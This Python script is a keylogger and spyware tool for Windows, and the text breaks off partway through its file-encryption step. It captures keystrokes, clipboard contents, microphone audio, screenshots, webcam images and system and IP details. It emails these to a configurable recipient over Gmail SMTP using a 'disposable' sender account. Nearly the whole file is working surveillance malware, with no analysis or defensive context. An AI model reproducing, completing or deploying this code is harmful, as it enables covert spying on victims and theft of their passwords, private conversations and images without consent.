# Import necessary libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from requests import get
from cv2 import VideoCapture, imshow, imwrite, destroyWindow, waitKey
from PIL import ImageGrab

# Global variables
log_file = "key_log.txt"
system_info_file = "syseminfo.txt"
clipboard_file = "clipboard.txt"
audio_file = "audio.wav"
screenshot_file = "screenshot.png"
webcam_shot_file = "webCamera.png"

encrypted_log_file = "e_key_log.txt"
encrypted_system_info_file = "e_systeminfo.txt"
encrypted_clipboard_file = "e_clipboard.txt"

mic_recording_time = 10
time_interval = 15
iteration_count = 3

email = "example@domain.com"  # Enter disposable email here
password = "myPa55w0rd"  # Enter email password here
recipient_email = ""  # Enter the email address you want to send your information to
encryption_key = ""  # Generate an encryption key from the Cryptography folder
file_path = ""  # Enter the file path you want your files to be saved to
file_path_separator = "\\"
full_file_path = file_path + file_path_separator

# Function to send email
def send_email(filename, attachment, recipient):
    sender_email = email
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    payload = MIMEBase('application', 'octet-stream')
    payload.set_payload((attachment).read())
    encoders.encode_base64(payload)
    payload.add_header('Content-Disposition', "attachment; filename=%s" % filename)
    msg.attach(payload)
    smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
    smtp_server.starttls()
    smtp_server.login(sender_email, password)
    email_content = msg.as_string()
    smtp_server.sendmail(sender_email, recipient, email_content)
    smtp_server.quit()

send_email(log_file, full_file_path + log_file, recipient_email)

# Function to get system information
def get_system_info():
    with open(full_file_path + system_info_file, "a") as file:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            file.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            file.write("Couldn't get Public IP Address (May be due to max query) \n")

        file.write("Processor Info: " + (platform.processor()) + '\n')
        file.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        file.write("Machine: " + platform.machine() + '\n')
        file.write("Hostname: " + hostname + '\n')
        file.write("Private IP Address: " + ip_address + '\n')

get_system_info()

# Function to copy clipboard data
def copy_clipboard_data():
    with open(full_file_path + clipboard_file, "a") as file:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write("Clipboard Data : \n" + pasted_data + '\n')
        except:
            file.write("Clipboard Could not be copied. \n")

copy_clipboard_data()

# Function to record audio from microphone
def record_audio():
    sampling_rate = 44100
    duration = mic_recording_time
    recording = sd.rec(int(duration * sampling_rate), samplerate=sampling_rate, channels=2)
    sd.wait()
    write(full_file_path + audio_file, sampling_rate, recording)

record_audio()

# Function to capture screenshots
def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(full_file_path + screenshot_file)

capture_screenshot()

# Function to capture webcam snapshot
def capture_webcam_shot():
    webcam = VideoCapture(0)
    result, image = webcam.read()
    if result:
        imshow("webCam", image)
        imwrite(full_file_path + webcam_shot_file, image)
        waitKey(1)
        destroyWindow("webCam")

capture_webcam_shot()

iteration_counter = 0
current_time = time.time()
stopping_time = time.time() + time_interval

# Keylogger functionality
while iteration_counter < iteration_count:
    key_count = 0
    key_strokes = []

    def on_key_press(key):
        global key_strokes, key_count, current_time
        print(key)
        key_strokes.append(key)
        key_count += 1
        current_time = time.time()

        if key_count >= 1:
            key_count = 0
            write_to_file(key_strokes)
            key_strokes = []

    def write_to_file(keys):
        with open(full_file_path + log_file, "a") as file:
            for key in keys:
                formatted_key = str(key).replace("'", "")
                if formatted_key.find("space") > 0:
                    file.write("\n")
                    file.close()
                elif formatted_key.find("Key") == -1:
                    file.write(formatted_key)
                    file.close()

    def on_key_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False

    with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

    if current_time > stopping_time:
        with open(full_file_path + log_file, "w") as file:
            file.write(" ")

        capture_screenshot()
        send_email(screenshot_file, full_file_path + screenshot_file, recipient_email)

        capture_webcam_shot()
        send_email(webcam_shot_file, full_file_path + webcam_shot_file, recipient_email)

        copy_clipboard_data()
        iteration_counter += 1
        current_time = time.time()
        stopping_time = time.time() + time_interval

# Encrypt files
files_to_encrypt = [full_file_path + system_info_file, full_file_path + clipboard_file, full_file_path + log_file]
encrypted_files = [full_file_path + encrypted_system_info_file, full_file_path + encrypted_clipboard_file,
                   full_file_path + encrypted_log_file]
file_index = 0

for file_to_encrypt in files_to_encrypt:
    with open(file_to_encrypt, 'rb') as file:
        data = file.read()
    cipher = Fernet(encryption_key)
    encrypted_data = cipher.encrypt
